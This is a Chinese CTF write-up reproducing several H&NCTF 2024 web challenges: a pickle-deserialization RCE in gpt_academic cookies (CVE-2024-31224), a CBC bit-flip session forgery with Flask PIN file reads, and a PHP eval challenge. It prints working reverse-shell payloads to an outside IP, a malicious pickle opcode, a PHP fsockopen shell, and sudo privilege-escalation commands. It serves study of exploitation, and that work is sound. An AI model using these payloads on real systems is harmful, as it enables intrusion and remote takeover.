<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526195128794.png" alt="image-20240526195128794"></p>
<p>这里赛后看了wp，考一个flask内存马，很好，没学过。接下来简单学学。</p>
<h1 id="web-gpts">WEB-GPTS</h1>
<p>这道题比赛时候也没看，赛后看了wp发现很有意思。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526201613362.png" alt="image-20240526201613362"></p>
<p>如上图，对于信息搜集，肯定基本用google，这里肯定要找到关键词才可以，由于这里在复现，也不想着浪费太多时间。</p>
<p>我首先是查看了源码，发现存在gradio_app的关键词，搜了搜，但没有相关漏洞，之后也尝试了中文关键词之类的，也是没啥用。总体看了看wp，感觉是gpt_academic关键词，我们可以查看源码搜一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526201920548.png" alt="image-20240526201920548"></p>
<p>也是发现真的存在相关的关键字，google一搜就出来了：pickle反序列化——基于cookie的滥用（差不多这个意思）</p>
<p>回过头来分析，做信息搜集的时候，可以多想一下是否是已经有过的github项目之类的，或者是一些专业术语，一看就是某类产品或者是项目的名字，这样去搜索可能性高一点。</p>
<p>那做了信息搜集，我们不难搜到这一篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">CVE-2024-31224 RCE 分析</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204210150.png" alt="image-20240526204210150"></p>
<p>其中漏洞点在上面这里：主要就是对于cookie的处理，对传入的参数进行pickle序列化，然后base64加密，然后在解析cookie的时候，先进行base64解密，然后loads进行picke反序列化，很明显这里对参数也没有进行任何过滤，这意味着我们可以RCE（前提就是参数d可控）</p>
<p>这里对于是否可控的分析，我就直接截图了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204602623.png" alt="image-20240526204602623"></p>
<p>解释一下：这里是那位师傅跟进这个from_cookie_str函数，看谁调用了这个（这样可以看到参数d的来源），上图就能看到这里参数d是来源于参数presistent_cookie_，但没有更具体的了，因此这位师傅猜测这个参数就是与用户的某些操作有关，于是搭建了项目，进行实践。</p>
<p>我们也可以直接在靶场中，找到自定义按钮这个功能区进行验证</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526204857025.png" alt="image-20240526204857025"></p>
<p>可以看到我们在没有使用自定义菜单功能的时候，只有一个cookie（这是靶场自带的），接下来我们按照下图，随便搞一个自定义按钮，之后再次查看就发现多了一个cookie，这里师傅分析说是，针对这个参数，项目中没有进行任何过滤，因此可以精心构造进行RCE</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526205049267.png" alt="image-20240526205049267"></p>
<p>我们仿照源码进行手搓opcode</p>
<p>我们先准备好payload</p>
<pre><code class="hljs scss">python3 -c 'import os,pty,socket;s=socket<span class="hljs-selector-class">.socket</span>();s<span class="hljs-selector-class">.connect</span>(("<span class="hljs-number">124.220</span>.<span class="hljs-number">233.26</span>",<span class="hljs-number">5555</span>));<span class="hljs-selector-attr">[os.dup2(s.fileno(),f)for f in(0,1,2)]</span>;pty<span class="hljs-selector-class">.spawn</span>("bash")'
<span class="hljs-comment">//进行base64编码</span>
cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI0LjIyMC4yMzMuMjYiLDU1NTUpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn</code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">def</span> <span class="hljs-title function_">from_cookie_str</span>(<span class="hljs-params">c</span>):
    pickled_dict = base64.b64decode(c.encode(<span class="hljs-string">"utf-8"</span>))
    <span class="hljs-keyword">return</span> pickle.loads(pickled_dict)

opcode = <span class="hljs-string">b'''cos</span>
<span class="hljs-string">system</span>
<span class="hljs-string">(S'bash -c "{cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI0LjIyMC4yMzMuMjYiLDU1NTUpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn}|{base64,-d}|{bash,-i}"'</span>
<span class="hljs-string">tR.'''</span>
opcode = base64.b64encode(opcode).decode(<span class="hljs-string">'utf-8'</span>)
<span class="hljs-built_in">print</span>(opcode)</code></pre>
<p>修改cookie为生成的数据，之后，重新加载页面，然后点击自定义按钮的“确认并保存”或者“加载已保存”按钮即可实现RCE</p>
<p>接下来就是提权了。。。有点不会</p>
<p>首先确定了当前用户是ctfgame，我们看一下该用户能够读取那些文件</p>
<pre><code class="hljs scss">find / -type f -user ctfgame -readable <span class="hljs-number">2</span>&gt;/dev/null</code></pre>
<p>寻找一番下来发现就下图这个mail文件很显眼</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211356592.png" alt="image-20240526211356592"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211415154.png" alt="image-20240526211415154"></p>
<p>读取发现我们能够登录ctfer这个用户</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526211736562.png" alt="image-20240526211736562"></p>
<p>这里说明了我们当前的用户可以在不需要密码的情况下，运行adduser的命令，那我们尝试创建一个用户（其实这里应该是尝试创建root用户，但这不可能，因为已经有了root用户，因此我们想要的是创建一个属于root用户组的用户），命令如下</p>
<pre><code class="hljs scss">sudo adduser test -gid=<span class="hljs-number">0</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526212534120.png" alt="image-20240526212534120"></p>
<p>如上图，我们成功创建，但我们发现依旧不能访问root目录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526212757779.png" alt="image-20240526212757779"></p>
<p>这里发现一个sudoers文件，但不是一个常规的linux文件，这里发现kobe用户能够使用apt-get命令，搜索一下是否能提权</p>
<pre><code class="hljs scss">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240526214040736.png" alt="image-20240526214040736"></p>
<p>另外有两个pickle反序列化写的好的文章：</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a>、<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBKfRbWWTzirD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14283%3Ftime__1311%3Dmqmx9QiQKDqGqx05dIDymDuDAOqf2%252BkdurD%26alichlgref%3Dhttps%253A%252F%252Fwww.bing.com%252F#toc-0">最近碰到的 Python pickle 反序列化小总结</a></p>
<h1 id="web-flippin">WEB-flippin</h1>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
<span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes
<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode
<span class="hljs-keyword">import</span> json

default_session = <span class="hljs-string">'{"admin": 0, "username": "user1"}'</span>
key = get_random_bytes(AES.block_size)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">'utf-8'</span>), AES.block_size)))


<span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):
    raw = b64decode(session)
    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])
    <span class="hljs-keyword">try</span>:
        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">'utf-8'</span>)
        <span class="hljs-keyword">return</span> res
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(e)

app = Flask(__name__)

filename_blacklist = {
    <span class="hljs-string">'self'</span>,
    <span class="hljs-string">'cgroup'</span>,
    <span class="hljs-string">'mountinfo'</span>,
    <span class="hljs-string">'env'</span>,
    <span class="hljs-string">'flag'</span>
}

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    session = request.cookies.get(<span class="hljs-string">'session'</span>)
    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        res = Response(
            <span class="hljs-string">"welcome to the FlipPIN server try request /hint to get the hint"</span>)
        res.set_cookie(<span class="hljs-string">'session'</span>, encrypt(default_session).decode())
        <span class="hljs-keyword">return</span> res
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'have a fun'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/hint"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():
    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">'text/plain'</span>)
    <span class="hljs-keyword">return</span> res


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/read"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():

    session = request.cookies.get(<span class="hljs-string">'session'</span>)
    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        res = Response(<span class="hljs-string">"you are not logged in"</span>)
        res.set_cookie(<span class="hljs-string">'session'</span>, encrypt(default_session))
        <span class="hljs-keyword">return</span> res
    <span class="hljs-keyword">else</span>:
        plain_session = decrypt(session)
        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'don\'t hack me'</span>

        session_data = json.loads(plain_session)

        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">'admin'</span>] :
            filename = request.args.get(<span class="hljs-string">'filename'</span>)

            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):
                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">'Access to this file is forbidden.'</span>)

            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
                    <span class="hljs-keyword">return</span> f.read()
            <span class="hljs-keyword">except</span> FileNotFoundError:
                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">'File not found.'</span>)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f'An error occurred: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>'</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'You are not an administrator'</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)</code></pre>
<p>一道计算flask pin的题目，我们先分析代码，首先是针对session的加解密，其中用的是aes算法，然后就是看read路由，如果判断我们的session中admin值为1，我们就能实现任意文件读取，并且再读取之前，会判断我们输入的filename参数内容是否在黑名单上面，不在的话就能读取了</p>
<p>这道题当初肯定就觉得加密这一块儿有问题，但搜了半天也没结果，看了wp是要打cbc翻转（没听过。。。）</p>
<p>找到了相关解释的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/V1040375575/article/details/111773524">https://blog.csdn.net/V1040375575/article/details/111773524</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>——这个感觉讲的清晰</p>
<p>就是根据加解密原理去进行某个位置对应的某个字符的翻转，对于这道题目，就是翻转0成为1，即可绕过，直接脚本小子了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode

url = <span class="hljs-string">"http://hnctf.yuanshen.life:34468/"</span>
default_session = <span class="hljs-string">'{"admin": 0, "username": "guest"}'</span>
res = requests.get(url)
c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">"session"</span>]))
c[default_session.index(<span class="hljs-string">"0"</span>)] ^= <span class="hljs-number">1</span>
evil = b64encode(c).decode()

filename = <span class="hljs-string">"/etc/passwd"</span>
url_attack = url + <span class="hljs-string">f"read?filename=<span class="hljs-subst">{filename}</span>"</span>
res = requests.get(url_attack, cookies={<span class="hljs-string">"session"</span>: evil})
<span class="hljs-built_in">print</span>(res.text)</code></pre>
<p>这里就是先base64解密，然后转换成字节数组，之后用index取该数组中的字节0，与1 xor 得到1，最终还原回去，成功伪造cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527174638870.png" alt="image-20240527174638870"></p>
<p>这里得到用户名为ctfUser，下图是根据代码的抱错部分得知，访问read路由，构造无效cookie即可抱错，得到绝对路径</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527174829543.png" alt="image-20240527174829543"></p>
<pre><code class="hljs scss">/usr/lib/python3<span class="hljs-selector-class">.9</span>/site-packages/flask/app<span class="hljs-selector-class">.py</span></code></pre>
<p>读取machine-id得到：02:42:ac:11:00:06</p>
<p>这里猜测是docker容器，所以需要读取这两个位置</p>
<pre><code class="hljs scss">/proc/sys/kernel/random/boot_id
/proc/self/cgroup <span class="hljs-comment">//但这个被黑名单过滤了部分字符</span>
<span class="hljs-comment">//百度一下就能知道如何绕过</span>
/proc/<span class="hljs-number">1</span>/mountinfo</code></pre>
<ul>
<li>过滤了self其中的<code>self</code>可以用相关进程的pid去替换,其实<code>1</code>就行</li>
<li>过滤了cgroup，用mountinfo<code>或者</code>cpuset</li>
</ul>
<p>最后读取环境变量</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527180149263.png" alt="image-20240527180149263"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/131659892">flask计算pin码</a></p>
<p><a target="_blank" rel="noopener" href="https://natro92.fun/posts/7ec3dbf/">2024 H&amp;NCTF 部分题目复现</a></p>
<h1 id="web-奇怪的网站">WEB-奇怪的网站</h1>
<p>不看wp还真就眼瞎了，真看不出来存在302，不抓包看都不行啊</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527181329398.png" alt="image-20240527181329398"></p>
<p>如上图所示，看到了vim异常的提示，说明存在vim缓存文件泄露</p>
<p>接着扫目录发现存在以下两个文件，猜测就是flag.php异常退出，我们访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527182138528.png" alt="image-20240527182138528"></p>
<p>发现当访问到.flag.php.swm的时候，得到异常文件，直接vim -r 恢复一下即可</p>
<pre><code class="hljs php">
<span class="hljs-comment">/*</span>
<span class="hljs-comment">you find me!</span>
<span class="hljs-comment">*/</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>
<span class="hljs-function"></span>{
  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">'1'</span>);
  <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">'9'</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$num</span>); <span class="hljs-variable">$i</span>++)
    {
      <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$num</span>{<span class="hljs-variable">$i</span>});
      <span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$c</span> &gt;= <span class="hljs-variable">$a</span>) &amp;&amp; (<span class="hljs-variable">$c</span> &lt;= <span class="hljs-variable">$b</span>) )
      {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
    }
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span> == <span class="hljs-string">'11259375'</span>;
}
<span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];</code></pre>
<p>这里意思是，你输入的num不能为数字1-9，但最后还要等于11259375，这里可以想到十六进制绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185137298.png" alt="image-20240527185137298"></p>
<p>这里又提示我们去首页看看。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185216188.png" alt="image-20240527185216188"></p>
<p>这令我很尴尬，忘记关注403的文件了，这也说明该文件是存在的。扫目录发现存在.htaccess文件，同时看了wp才知道，首页url后面是index.png，说明图片被当成php解析了，证明存在.htaccess文件配置解析错误</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527185750296.png" alt=" "></p>
<p>访问404.php，看到http响应头有个提示：PUT之后，服务器是否直接写入文件？preflight？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527190229348.png" alt="image-20240527190229348"></p>
<p>这里官方wp说的是：</p>
<pre><code class="hljs scss">考察 尝试更改method方法为 OPTIONS ，可以利用文件读取漏洞，读取<span class="hljs-selector-class">.htaccess</span>文件隐藏文件ggggoku<span class="hljs-selector-class">.php</span>，进行rce</code></pre>
<p>但我实在是不知道如何读取。。。先跳过吧，问一些师傅再说</p>
<pre><code class="hljs scss">ggggoku<span class="hljs-selector-class">.php</span>?<span class="hljs-selector-tag">a</span>=${<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">0</span>])}

<span class="hljs-number">0</span>=<span class="hljs-variable">$sock</span>=<span class="hljs-built_in">fsockopen</span>("<span class="hljs-number">124.220</span>.<span class="hljs-number">233.26</span>",<span class="hljs-number">5555</span>);<span class="hljs-built_in">popen</span>("bash &lt;&amp;<span class="hljs-number">3</span> &gt;&amp;<span class="hljs-number">3</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">3</span>", "r");<span class="hljs-comment">//这里需要url编码</span></code></pre>
<p>之后就是常规提权，我的提权经验就很少了，完全靠wp</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CH-NCTF2024%5Cimage-20240527202713128.png" alt="image-20240527202713128"></p>
<p>先是find查找suid是否能提权，这里发现su</p>
<pre><code class="hljs scss">su：【全称switch user】身份切换，使用普通用户登录，然后使用su命令切换到root
优点:简单
缺点:需要知道root密码</code></pre>
